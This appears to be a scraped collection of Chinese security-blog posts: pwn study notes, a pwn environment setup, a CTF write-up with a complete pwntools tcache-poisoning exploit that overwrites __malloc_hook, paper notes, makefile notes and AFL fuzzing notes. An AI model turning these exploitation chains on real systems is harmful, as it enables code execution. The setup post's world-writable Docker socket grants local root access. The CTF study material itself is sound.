值劫持流程(在glibc中的函数，默认情况下经过 ELF 的延迟绑定是不是意味着都可以进行got值劫持流程) 栈的 TLS 结构, stack_guard, TLS中保存canary值, TLS中的值又由security_init初始化 fsb 漏洞 ELF重映射 canary的解法: 各种保护的实现 integer overflow, off-by-one format参考列表: %c：输出字符，配上%n可用于向指定地址写数据。 %d：输出十进制整数，配上%n可用于向指定地址写数据。 %x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。 %p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。 %s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。 %n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。 %n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。 汇编语言, gdb调试命令和技巧, pwntools的具体功能chown, charp, chmod, NX Bit 内存区域不可执行, 可执区域不可写.(使数据，堆栈和堆段不可执行，而代码段不可写). 所以绕过NX位并实现任意代码执行的基本思路:寻找原有代码中有”漏洞”的函数,在堆栈中写入相关参数后调用它(即跳跃到它的地址).这就是return-to-libc.可以理解为直接执行一段shellcode的时候会被打断. readelf -l 文件可查看文件性质 ESP Lifiting技术(没解决),Frame Faking技术. seteuid leave ret libc函数地址本身包含一个NULL字节 (?坏字符) 零也是一个坏字符 查看libc库函数的位置 sprintf函数, strcpy不能用于漏洞代码 ??? ASLR ldd aslr影响对象: return-to-plt 共享库,动态链接器,plt,got,重定位, 第一次 exit函数 readelf -s libc.so.6 | grep system Brute Force 假定一个libc地址 用ldd ./vuln | grep libc 限于x86 爆破栈和堆 GOT overwrite and GOT dereference ropeme ROPgadget rp++ objdump -R vuln 查看函数GOT条目位置,IDA 使用unlink的堆溢出 对于不是 mmap 的块，会向前或向后合并。??? 通常堆内存的第一个块的前面那个块是分配的（即使它不存在）??? 攻击者的覆盖操作的具体设置原因 prev_size为偶数，因此PREV_INUSE是未设置的 ??? unlink的具体操作 ,FD和BK相聚12 ??? exp RELRO canary 栈的TLS结构 概念性问题 0xa canary 4位 泄露canary 爆破canary ??? 结合NX的爆破来看 劫持_stack_chk_fail函数 IDA 使用技巧总结 ROP ret2text 即控制程序执行程序本身已有的的代码 (.text) ret2shellcode，即控制程序执行 shellcode 代码 vmmap 查看各个段的情况 (具体区分???) ret2syscall，即控制程序执行系统调用，获取 shell。 当系统调用所需参数的个数不超过5个的时候,执行”int$0x80”指令时,需在eax中存放系统调用的功能号,传递给系统调用的参数则按照参数顺序依次存放到寄存器ebx,ecx,edx,esi,edi中,当系统调用完成之后,返回值存放在eax中;64位也是 一些敏感函数源码 ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容) 注意正常的调用函数和非正常的调用函数对栈结构的影响 泄露的时候注意返回地址是symbol的main函数,因为还要执行嘛 怎样查看程序编译进去的函数 ret2csu 利用 x64 下的 __libc_csu_init 中的 gadgets ret2reg BROP 是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。 在 libc_csu_init 的结尾一长串的 gadgets，我们可以通过偏移来获取 write 函数调用的前两个参数。可以找到 strcmp 函数，从而来控制 rdx ret2libc_csu_init 可以知道该地址减去 0x1a 就会得到其上一个 gadgets ??? plt 表项的慢路径 ret2_dl_runtime_reslove linux 中是利用_dl_runtime_resolve(link_map_obj, reloc_index) 来对动态链接的函数进行重定位 plt[0] 栈迁移到bss段来控制write函数 readelf -S 为什么/bin/sh要填在中间, stack构造的大小等数据怎么选择, objdump -d -j .plt objdump -s -j .rel.plt SROP retVDSO stack pivoting 持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP frame faking构造一个虚假的栈帧来控制程序的执行流 read 并不会给输入末尾补上 ‘\\0’, gets读取回补\\x00 为什么不给末尾加\\0 可以leak栈上内容 一个地址空间接收时从低位开始填 pwndbg的寻找偏移量 可以布置调用 execve(“/bin/sh”, 0, 0) 的利用链, 这种方法更稳妥 (system(“/bin/sh”) 可能会因为 env 被破坏而失效), 不过由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过调试来确定 stack smash partial overwrite pwndbg 暴露canary值 页内偏移 pwntools的context.terminal等 2018 - 安恒杯 - babypie 为什么不直接用该函数地址是因为aslr吗 那为什么不覆盖低12位增大概率? 我用 pwndbg gef peda能干什么 如何查看__libc_start_main+240 位于 libc 中，_dl_init+139 位于 ld 中 libc基址 ld基址 我们一般要覆盖字节的话，至少要覆盖 1 个半字节才能够获取跳到onegadget。而我们覆盖字节的时候必须覆盖整数倍个数，即至少会覆盖 3 个字节 memory map查看 格式化字符串漏洞 泄露内存 泄露栈内存: 获取某个变量值, 获取某个变量对应地址的内存 泄露任意地址内存: 利用GOT表得到libc函数地址,进而获取libc, 进而获取其他libc函数地址 盲打, dump整个程序,获取有用信息 gef 中 直接打 got出来got表 gdb.attach(sh) gdb相同的函数怎么下断点 有时候，我们需要对我们输入的格式化字符串进行填充,使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处 覆盖内存 例题为什么要达到16个字符, 对齐? payload哪有再次12个字符? 覆盖任意地址内存 覆盖小数字 为什么要把%k 和 $n分开? 因为是两个参数? 意思差不多是我们没有必要必须把地址放在最前面，放在那里都可以，只要我们可以找到其对应的偏移即可。 覆盖大数字 objdump -R 查看一个程序的GOT函数的地址 PLT[0]是一个函数, 这个函数的作用是通过GOT[1],GOT[2]来正确绑定一个函数的正式地址到GOT表中来, 同时在一个函数没有运行一次之前, GOT表中的数据位@plt函数中下一条指令的地址. 64位程序格式化字符串漏洞 注意栈上的参数是在6个寄存器参数之后的 hijack GOT 在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的 ??? 一般默认远程都是开启 ASLR 保护的 hijack retaddr (存疑)修改地址那里 这个信息怎么看…. 格式化字符串盲打 由于程序是 64 位，所以我们从 0x400000 处开始泄露","link":"/2019/06/01/2019-06-01-pwn-za-ji/"},{"title":"WSL2内用docker配置pwn环境","text":"迁移文件系统# 重要的事情只说一遍, 一定要尝试迁移文件系统, 不然它会在不经意间吞噬你c盘的空间 WSL 的文件系统位于 C 盘，当安装的软件越来越多时，会占用大量的 C 盘空间。这对于使用 SSD 的同学或者C 盘空间本身很小的同学十分不便，因此很多人都存在将 WSL rootfs 迁移至系统其它路径的需求。该问题官方正在研究一种稳定可行的方案，具体进展详见 https://github.com/Microsoft/WSL/issues/449. 目前一个比较好的解决方案是采用DDoSolitary开发的 LxRunOffline. 其解决方案如下：下载 LxRunOffline 软件 链接为：https://github.com/DDoSolitary/LxRunOffline/releases 解压，并在该目录下打开命令提示符，输入如下指令 显示当前的 Distribution 名称 12LxRunOffline listUbuntu-18.04 移动该 Distribution 1LxRunOffline move -n Ubuntu-18.04 -d F:\\wslroot 上述命令将整个 WSL 的 rootfs 移动至 F:\\wslroot 文件夹下。 check 能否正常使用，按照使用一节提示的操作进行即可。 基本配置 至于换源啥的就不用多废话了, 放个18.04的阿里源, 方便我自己…. 12345678910deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse 搞个docker做pwn, 写个一键化脚本 其中有些地方要输入 [Y/n] 的选项,所以也不算一键化….123456789sudo apt updatesudo apt upgradesudo apt-get remove docker docker-engine docker.iosudo apt-get updatesudo apt-get install apt-transport-https ca-certificates curl software-properties-commoncurl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -sudo add-apt-repository \"deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable\"sudo apt-get updatesudo apt-get install docker-ce 当你启动docker的问题 这个问题其实是docker运行的权限问题, 会容易遇到如下报错, 这里给出解决方法the way to solve “docker: Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post http://%2Fvar%2Frun%2Fdocker.sock/v1.26/containers/create: dial unix /var/run/docker.sock: connect: permission denied.”: 1.Add current user to docker group 1sudo usermod -aG docker $USER 2.Change the permissions of docker socket to be able to connect to the docker daemon /var/run/docker.sock 1sudo chmod 666 /var/run/docker.sock ancypwn 这里我推荐ancypwn, 其实还有个pwndocker, 但它的gdb是8.2的,存有bug,我当初懒得打补丁了,就换了ancypwn. 但是pwndocker中有glibc很多的版本,建议github上下下来以后放ancypwn里. zsh tmux## 前面更新源啥的就不再累述了 zsh这里介绍curl安装方法,也可以wget.然后配置啥的都是按我自己喜欢的来了… 12sudo apt install zshchsh -s /bin/zsh 当然要有on-my-zsh 1sh -c \"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" 语法高亮 1git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting 语句历史补全 1git clone git://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions 当然除了这两个插件还要建议extract,git在~/.zshrc里编辑, 然后 1source ~/.zshrc pwn环境呢 pwndbg和pwngdb, 其中pwngdb没配好 123cd ~/git clone https://github.com/scwuaptx/Pwngdb.git cp ~/Pwngdb/.gdbinit ~/ 注意这里会在gdbinit中把pwndbg覆盖了, 所以要在其中重新将pwndbg的路径放到文件的第一行 其他的,以后有想到啥再说吧…","link":"/2019/09/08/2019-09-08-environment/"},{"title":"数字经济云安全众测大赛复现(tcache poisoning)","text":"amazon 这题没做出，靠着复现大佬的exp和阿鹏师傅的提示才摸索着明白了思路。 数据结构结合调试和buy函数里的内容就很清楚了,不多说看图所以结构如下：123456struct node{ char* item; //0x10 //间隔0x10 char* content; int size;//0x8} 漏洞点也很明显,free后未置零,可double free. 因为题目给了libc-2.27的文件…暗示很明显…要搞tcache.又因为这题保护全开,所以思路基本上是改hook具体的思路：泄露libc，heap地址后，利用double_free 攻击small_bin 来构造overlap chunk(由于main_arena的top指针会被覆盖，所以后期不能从top_chunk分配，之前就要构造好chunk结构），最后利用tcache poisoning覆盖到malloc_hook与realloc_hook 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102from pwn import *#context.log_level = 'debug'p = process('./amazon')#p=remote(\"121.41.38.38\",9999)libc=ELF(\"./libc-2.27.so\")def g(p,data=False): gdb.attach(p,data) raw_input()def ru(x): return p.recvuntil(x)def se(x): p.send(x)def sl(x): p.sendline(x)def rl(): return p.recvline()def re(x): return p.recv(x)def add(idx,price,length,data): ru(\"Your choice: \") sl(str(1)) ru(\"uy: \") sl(str(idx)) ru(\"many: \") sl(str(price)) ru(\"note: \") sl(str(length)) ru(\"tent: \") se(data)def add2(idx,price,length): ru(\"Your choice: \") sl(str(1)) ru(\"uy: \") sl(str(idx)) ru(\"many: \") sl(str(price)) ru(\"note: \") sl(str(length))def show(): ru(\"Your choice: \") sl(str(2))def free(idx): ru(\"Your choice: \") sl(str(3)) ru(\"for: \") sl(str(idx))add(1,0x10,0x90,\"1\"*8)add(1,0x10,0x80,p64(0))free(1)add(1,0x10,0x30,\"3\"*8)free(2)add(1,0x10,0x20,\";$0\\x00\")add(1,0x10,0x20,\"2\"*8)free(0)free(0)show()ru(\"Name: \")heap=u64(re(6).ljust(8,\"\\x00\"))-0x260print hex(heap)for i in range(6): free(0) ##多次free 0, 将0放入unsortedbin中, 使得tcache的链最后指向unsortedbinshow()ru(\"Name: \")lib=u64(re(6).ljust(8,\"\\x00\"))-0x3ebca0print hex(lib)hook=libc.symbols[\"__malloc_hook\"]hook=lib+hookprint hex(hook)one=lib+0x10a38crealloc=lib+libc.symbols[\"realloc\"]print hex(realloc)add(1,0x10,0x80,\"y\"*0x60+p64(0)+p64(0x51)+p64(lib+0x3ebce0)*2) ##在堆上伪造0x50的堆块,并且将该堆块的fd和bk指向smallbin.add(1,0x10,0x90,\"1\"*8)add(1,0x10,0x90,p64(lib+0x3ebcb0)*2+p64(lib+0x3ebcc0)*2+p64(lib+0x3ebcd0)*2+p64(heap+0x340+0x60)*2)# 将unsortedbin分配出来，修改之后的smallbin，将smallbin 的fd和bk指向之前伪造的堆块add(1,0x10,0x20,p64(hook-0x28)) add(1,0x10,0x30,\"wwe\")add(1,0x10,0x30,p64(one)+p64(realloc+0x9))add2(1,1,0x60)p.interactive()","link":"/2019/09/24/2019-09-24-szjj/"},{"title":"Moonshine论文阅读","text":"基于白盒源码生成歧义性数据通常依赖于手工编码规则来生成可以引导模糊测试过程的系统调用的有效种子序列,但是限制较多,难度较大. MoonShine: Optimizing OS Fuzzer Seed Selection with Trace Distillation-USENIX-2018简介: 通过提取程序中的syscall trace, 并且对trace蒸馏,在保证代码覆盖率的前提下，尽可能缩小trace的size，来生成OS Fuzz的种子。 针对系统调用跟踪的任意大小性和重复性对模糊测试速度的放缓问题的研究 核心方法: 利用轻量级静态分析，有效地检测不同系统调用之间的依赖关系。 蒸馏的时候，将syscall的依赖关系分为两类： 显式依赖关系: 函数c1的结果(输出)被函数c2作为参数之一(输入) 隐式依赖关系: 函数c1通过内核中的某个共享数据结构的写操作影响函数c2的读操作(即使c1的输出和c2的输入参数之间没有重叠) c1必须在其控制流中具有条件，该控制流取决于由c2修改的全局值。(可以细化数据流,但效率有所牺牲) (内核锁定映射到进程地址空间的所有内存页以避免交换) Moonshine首先查找明确的依赖关系, 然后对内核源代码使用静态分析的技术来查看隐含的依赖关系 种子筛选算法 (DES) 系统调用跟踪集合S中指令以覆盖率降序的方式排序 分别捕获两种依赖关系并合并 将提纯后的排序与原排序匹配 添加到种子集合 捕获显式关系算法: 对于每个调用的返回值，构造相应的结果节点并将其添加到图形中 (结果节点: 存储返回值, 返回类型和跟踪中产生结果的调用) (图形: 网状结构, 参数结点和结果节点相连表示有依赖关系) 对每个参数检查其缓存中的条目是否命中 迭代存储在图形中的所有结果节点以获取特定类型和值，并将参数节点中的一条边添加到图中的每个结果节点。 隐式也是迭代检查,类似的. 隐式和显式函数相互调用,但最终接近跟踪的开头而终止 用到的方法跟踪器: Strace 多进程跟踪 构建进程树, 本地缓存的关系图 问题举例: 两个种子（目前放在单独的提纯程序中）被发现彼此依赖。 在这种情况下，MoonShine将两个程序合并为一个 隐式关系: 基于Smatch构建, c的静态分析框架(Hook) 通过注册一元运算符挂钩和分配挂钩来跟踪写入依赖关系, 将结构和字段记录为写入依赖项。","link":"/2019/10/09/2019-10-09-moonshine/"},{"title":"makefile学习笔记","text":"makefile学习笔记在使用make命令时, 如果工程只有部分c文件修改,那么我们只编译被修改的c文件,并链接目标程序. 如果这个工程的头文件被改变了,那么我们需要编译引用了这几个头文件的 c 文件,并链接目标程序。 make的工作原理, 即更新当前目录下(M)makefile中的第一个目标文件(该更新的则找相应规则). 其他的非目标文件用作动作指令. VPATH变量用来质定’依赖文件’的搜索路径 符号 ‘-‘ 一般用来不管是否出错继续执行的操作,可用在 include和编译命令cc等前. 全局的办法是make 加上 -i ,那么，Makefile 中所有命令都会忽略错误. 而 -k 参数意味着终止出错规则的执行,但是继续执行其他规则. 静态模式 ‘%’符号的运用常见有 1$(object): %.o :%.c prereq-parrterns 是目标的依赖模式，它对 target-parrtern 形成的模式再进行一次依赖目标的定义。结合懒人写法 filter过滤器: 1$(filter %.o,$(files)): %.o: %.c $(filter %.o,$(files)) 表示调用 Makefile 的 filter 函数，过滤“$files”集，只保留其中模式为“%.o”的内容. awk,sed命令, 还不是很理解的生成.d文件的一个模式规则: 12345%.d: %.c @set -e; rm -f $@; \\ $(CC) -M $(CPPFLAGS) $&lt; &gt; $@.$$$$; \\ sed 's,\\($*\\)\\.o[ :]*,\\1.o $@ : ,g' &lt; $@.$$$$ &gt; $@; \\ rm -f $@.$$$$ 希望两条命令顺序或者说后者在前者的基础上执行,则应该写一行上并用 ‘;’ 分割. 传递变量到下级makefile用export, 但是SHELL和MAKEFLAGS是系统级的环境变量.自动传递. 在变量中使用函数会使make 运行时非常慢,会使用得两个 make 的函数“wildcard”和“shell”发生不可预知的错误。’:=’ 使左侧变量只能使用右侧’ $()’ 内已经定义的变量和其他字符. 定义变量时注意’#’ 会表示变量定义终止的特性. ‘?=’ 用于’检验型定义’ makefile中定义的系统环境变量和命令行带入的系统环境变量或覆盖系统原有的环境变量值. 但’-e’参数可以使原有系统环境变量覆盖Makefile中定义的变量. 可以为某个目标设置局部变量,它的作用范围就在这条规则以及连带规则中. 模式变量用法类似目标变量 常用的字符串处理函数有1234567891011$(subst &lt;from&gt;,&lt;to&gt;,&lt;text&gt;)$(patsubst &lt;pattern&gt;,&lt;replacement&gt;,&lt;text&gt;)$(strip &lt;string&gt;)$(findstring &lt;find&gt;,&lt;in&gt;)$(filter &lt;pattern...&gt;,&lt;text&gt;)$(filter-out &lt;pattern...&gt;,&lt;text&gt;)$(sort &lt;list&gt;)$(word &lt;n&gt;,&lt;text&gt;)$(wordlist &lt;ss&gt;,&lt;e&gt;,&lt;text&gt;)$(words &lt;text&gt;)$(firstword &lt;text&gt;) 文件名操作函数1234567$(dir &lt;names...&gt;)$(notdir &lt;names...&gt;)$(suffix &lt;names...&gt;)$(basename &lt;names...&gt;)$(addsuffix &lt;suffix&gt;,&lt;names...&gt;)$(addprefix &lt;prefix&gt;,&lt;names...&gt;)$(join &lt;list1&gt;,&lt;list2&gt;) 其他的常见函数循环函数 1$(foreach &lt;var&gt;,&lt;list&gt;,&lt;text&gt;) 一句话判断 1$(if &lt;condition&gt;,&lt;then-part&gt;,&lt;else-part&gt;) 创建新函数 1$(call &lt;expression&gt;,&lt;parm1&gt;,&lt;parm2&gt;,...,&lt;parmn&gt;) 查询性质 1$(origin &lt;variable&gt;) shell函数 12contents := $(shell cat foo)files := $(shell echo *.c) 控制make执行流, error报错可让make退出 12$(error &lt;text ...&gt;)$(warning &lt;text ...&gt;) MAKECMDGOALS环境变量存放指定的终极目标的列表. CFLAGS可以控制编译时的编译器参数 贴些常用的隐含规则 编译 C++ 程序的隐含规则。 &lt; n &gt;.o 的目标的依赖目标会自动推导为 &lt; n &gt;.cc 或是 &lt; n &gt;.C ，并且其生成命令是 1$(CXX) –c $(CPPFLAGS) $(CFLAGS) 。（建议使用 .cc 作为 C++ 源文件的后缀，而不是 .C ） 编译 C 程序的隐含规则。 &lt; n &gt;.o 的目标的依赖目标会自动推导为 &lt; n &gt;.c ，并且其生成命令 1$(CC) –c $(CPPFLAGS) $(CFLAGS) 汇编和汇编预处理的隐含规则。 .o 的目标的依赖目标会自动推导为 .s ，默认使用编译品 as ，并且其生成命令是： 1$ (AS) $(ASFLAGS) 。 .s 的目标的依赖目标会自动推导为 .S ，默认使用 C 预编译器 cpp ，并且其生成命令是 1$(AS) $(ASFLAGS) 链接 Object 文件的隐含规则。目标依赖于 .o ，通过运行 C 的编译器来运行链接程序生成（一般是 ld ），其生成命令是： 1$(CC) $(LDFLAGS) &lt;n&gt;.o $(LOADLIBES) $(LDLIBS) 这个规则对于只有一个源文件的工程有效，同时也对多个 Object 文件（由不同的源文件生成）的也有效。例如如下规则: 123456789x : y.o z.o并且 x.c 、y.c 和 z.c 都存在时，隐含规则将执行如下命令:cc -c x.c -o x.occ -c y.c -o y.occ -c z.c -o z.occ x.o y.o z.o -o xrm -f x.orm -f y.orm -f z.o 关于命令的变量 1234567891011121314151617181920• AR : 函数库打包程序。默认命令是 ar• AS : 汇编语言编译程序。默认命令是 as• CC : C 语言编译程序。默认命令是 cc• CXX : C++ 语言编译程序。默认命令是 g++• CO : 从 RCS 文件中扩展文件程序。默认命令是 co• CPP : C 程序的预处理器（输出是标准输出设备）。默认命令是 $(CC) –E• FC : Fortran 和 Ratfor 的编译器和预处理程序。默认命令是 f77• GET : 从 SCCS 文件中扩展文件的程序。默认命令是 get• LEX : Lex 方法分析器程序（针对于 C 或 Ratfor）。默认命令是 lex• PC : Pascal 语言编译程序。默认命令是 pc• YACC : Yacc 文法分析器（针对于 C 程序）。默认命令是 yacc• YACCR : Yacc 文法分析器（针对于 Ratfor 程序）。默认命令是 yacc –r• MAKEINFO : 转换 Texinfo 源文件（.texi）到 Info 文件程序。默认命令是 makeinfo• TEX : 从 TeX 源文件创建 TeX DVI 文件的程序。默认命令是 tex• TEXI2DVI : 从 Texinfo 源文件创建军 TeX DVI 文件的程序。默认命令是 texi2dvi• WEAVE : 转换 Web 到 TeX 的程序。默认命令是 weave• CWEAVE : 转换 C Web 到 TeX 的程序。默认命令是 cweave• TANGLE : 转换 Web 到 Pascal 语言的程序。默认命令是 tangle• CTANGLE : 转换 C Web 到 C。默认命令是 ctangle• RM : 删除文件命令。默认命令是 rm –f 关于命令参数的变量 1234567891011121314下面的这些变量都是相关上面的命令的参数。如果没有指明其默认值，那么其默认值都是空。• ARFLAGS : 函数库打包程序 AR 命令的参数。默认值是 rv• ASFLAGS : 汇编语言编译器参数。（当明显地调用 .s 或 .S 文件时）• CFLAGS : C 语言编译器参数。• CXXFLAGS : C++ 语言编译器参数。• COFLAGS : RCS 命令参数。• CPPFLAGS : C 预处理器参数。（C 和 Fortran 编译器也会用到）。• FFLAGS : Fortran 语言编译器参数。• GFLAGS : SCCS “get”程序参数。• LDFLAGS : 链接器参数。（如：ld ）• LFLAGS : Lex 文法分析器参数。• PFLAGS : Pascal 语言编译器参数。• RFLAGS : Ratfor 程序的 Fortran 编译器参数。• YFLAGS : Yacc 文法分析器参数。 模式规则: 1234%.o : %.c ; &lt;command ......&gt;;例子:%.o : %.c$(CC) -c $(CFLAGS) $(CPPFLAGS) $&lt; -o $@ 指出了怎么从所有的 .c 文件生成相应的 .o 文件的规则。 自动化变量$@ : 表示规则中的目标文件集。在模式规则中，如果有多个目标，那么，$@ 就是匹配于目标中模式定义的集合。 • $% : 仅当目标是函数库文件中，表示规则中的目标成员名。例如，如果一个目标是 foo.a(bar.o)，那么，$% 就是 bar.o ，$@ 就是 foo.a 。如果目标不是函数库文件（Unix 下是 .a ，Windows下是 .lib ），那么，其值为空。 • $&lt; : 依赖目标中的第一个目标名字。如果依赖目标是以模式（即 % ）定义的，那么 $&lt; 将是符合模式的一系列的文件集。注意，其是一个一个取出来的。 • $? : 所有比目标新的依赖目标的集合。以空格分隔。 • $^ : 所有的依赖目标的集合。以空格分隔。如果在依赖目标中有多个重复的，那个这个变量会去除重复的依赖目标，只保留一份。 • $+ : 这个变量很像 $^ ，也是所有依赖目标的集合。只是它不去除重复的依赖目标。 • $* : 这个变量表示目标模式中 % 及其之前的部分。如果目标是 dir/a.foo.b ，并且目标的模式是a.%.b ，那么，$* 的值就是 dir/a.foo 。这个变量对于构造有关联的文件名是比较有较。如果目标中没有模式的定义，那么 $* 也就不能被推导出，但是，如果目标文件的后缀是 make 所识别的，那么 $* 就是除了后缀的那一部分。例如：如果目标是 foo.c ，因为 .c 是 make 所能识别的后缀名，所以，$* 的值就是 foo 。这个特性是 GNU make 的，很有可能不兼容于其它版本的 make，所以，你应该尽量避免使用 $* ，除非是在隐含规则或是静态模式中。如果目标中的后缀是 make 所不能识别的，那么 $* 就是空值。 所有的后缀规则在 Makefile 被载入内存时，会被转换成模式规则","link":"/2019/10/07/2019-10-07-mf/"},{"title":"fuzz相关笔记整理","text":"afl tips fuzz_one ///测试用例变异过程common_fuzz_stuff //变异完成后的通用步骤write_to_testcase //将变异后的内容写入测试文件run_target //运行目标进程save_if_intersting //判断是否保存该测试用例has_new_bits //判断该测试用例是否产生新状态 插桩模块: 普通模式, qemu模式, llvm模式 fuzz模块: 初始化, fuzzing策略, 语料库更迭 语料库及测试用例的最小化, 并行fuzz, 语法字典, 内存检测工具 代码插桩1fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE)); 在处理到某个分支时,需要插入桩代码,afl-as会生成一个随机数,作为运行时保存在ecx中的值. 便是用于标识这个代码块的key. 分支信息记录在分支点注入的代码本质上相当于 123cur_location = ;shared_mem[cur_location ^ prev_location]++;prev_location = cur_location &gt;&gt; 1; 在_afl_maybe_log()中可以看到其实现. fuzz tipsAFL 未设计针对有特定状态机的复杂网络程序的fuzz, peach是更合适的选择. 使用AFL的tips: 1. 尽量使测试用例足够小, 规模往往和因fuzz而触发的错误存在相关性 2. 较小的文件会不仅可以减少测试和处理的时间，也能节约更多的内存，AFL给出的建议是最好小于1 KB，但其实可以根据自己测试的程序权衡，这在AFL文档的`perf_tips.txt`中有具体说明。 3. 确保测试对象足够简单(简单高效) 4. 只给需要测的库进行打桩汇编级别的插桩, 所以可以用未插桩的库替换掉被测程序中使用AFL编译器编译出来的库. 5. 并行, 因为afl-fuzz设计成只给工作进程分配一个核.gdb的栈回溯怎么看 gdb afl-case1 -ex “set args out/crashes/id:000001,sig:06,src:000003,op:havoc,rep:128”` fuzz的一个关键点是创建好的测试用例，通过分析目标程序的所有潜在路径来最大化输入的覆盖率。 种子选择输入文件: 使用项目自身提供的测试用例 目标程序bug提交页面 使用格式转换器，用从现有的文件格式生成一些不容易找到的文件格式： afl源码的testcases目录下提供了一些测试用例 其他大型的语料库 afl generated image test sets fuzzer-test-suite libav samples ffmpeg samples fuzzdata moonshine afl-cmin 尝试找到与语料库全集具有相同覆盖范围的最小子集 afl-tmin 尝试减小单个输入文件的大小 在Fuzzing共享库时，将输入传递给要Fuzzing的库。这种情况下，可以通过设置LD_LIBRARY_PATH让程序加载经过AFL插桩的.so文件，不过最简单的方法是静态构建，通过以下方式实现： 1$ ./configure --disable-shared CC=&quot;afl-gcc&quot; CXX=&quot;afl-g++&quot; afl-showmap 跟踪单个输入的执行路径,并打印程序执行的输出,捕获的元组. afl-fuzz并行Fuzzing，一般的做法是通过-M参数指定一个主Fuzzer(Master Fuzzer)、通过-S参数指定多个从Fuzzer(Slave Fuzzer)。 这两种类型的Fuzzer执行不同的Fuzzing策略，前者进行确定性测试（deterministic ），即对输入文件进行一些特殊而非随机的的变异；后者进行完全随机的变异。 多系统并行测试的一个脚本参考 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/bin/sh# 所有要同步的主机FUZZ_HOSTS='172.21.5.101 172.21.5.102'# SSH userFUZZ_USER=root# 同步目录SYNC_DIR='/root/syncdir'# 同步间隔时间SYNC_INTERVAL=$((30 * 60))if [ &quot;$AFL_ALLOW_TMP&quot; = &quot;&quot; ]; then if [ &quot;$PWD&quot; = &quot;/tmp&quot; -o &quot;$PWD&quot; = &quot;/var/tmp&quot; ]; then echo &quot;[-] Error: do not use shared /tmp or /var/tmp directories with this script.&quot; 1&gt;&amp;2 exit 1 fifirm -rf .sync_tmp 2&gt;/dev/nullmkdir .sync_tmp || exit 1while :; do # 打包所有机器上的数据 for host in $FUZZ_HOSTS; do echo &quot;[*] Retrieving data from ${host}...&quot; ssh -o 'passwordauthentication no' ${FUZZ_USER}@${host} \\ &quot;cd '$SYNC_DIR' &amp;&amp; tar -czf - SESSION*&quot; &gt;&quot;.sync_tmp/${host}.tgz&quot; done # 分发数据 for dst_host in $FUZZ_HOSTS; do echo &quot;[*] Distributing data to ${dst_host}...&quot; for src_host in $FUZZ_HOSTS; do test &quot;$src_host&quot; = &quot;$dst_host&quot; &amp;&amp; continue echo &quot; Sending fuzzer data from ${src_host}...&quot; ssh -o 'passwordauthentication no' ${FUZZ_USER}@$dst_host \\ &quot;cd '$SYNC_DIR' &amp;&amp; tar -xkzf - &amp;&gt;/dev/null&quot; &lt;&quot;.sync_tmp/${src_host}.tgz&quot; done done echo &quot;[+] Done. Sleeping for $SYNC_INTERVAL seconds (Ctrl-C to quit).&quot; sleep $SYNC_INTERVALdone crash exploration mode 1$ afl-fuzz -m none -C -i poc -o peruvian-were-rabbit_out -- ~/src/LuPng/a.out @@ out.png afl-collect 基于exploitable来检查crashes的可利用性。它可以自动删除无效的crash样本、删除重复样本以及自动化样本分类。 1$ afl-collect -j 8 -d crashes.db -e gdb_script ./afl_sync_dir ./collection_dir -- /path/to/target --target-opts 无论是GCC的GCOV还是LLVM的SanitizerCoverage，都提供函数（function）、基本块（basic-block）、边界（edge）三种级别的覆盖率检测 llvm的官方文档 Address Sanitizer 如何使用 如何去分析crash 为了避免构建语法感知工具的麻烦，afl-fuzz提供了一种使用语言关键字，magic header或其他与目标数据类型相关联的特殊表示的可选字典为模糊过程提供种子的方法 - 并且使用它来重建底层语法 afl提供种子的方法 要使用这个功能，首先需要创建在dictionaries/README.dictionaries中讨论的两种格式之一的字典；然后在命令行中使用-x选项将fuzzer指向它。（在该目录的子目录下已经提供了几个常用字典） 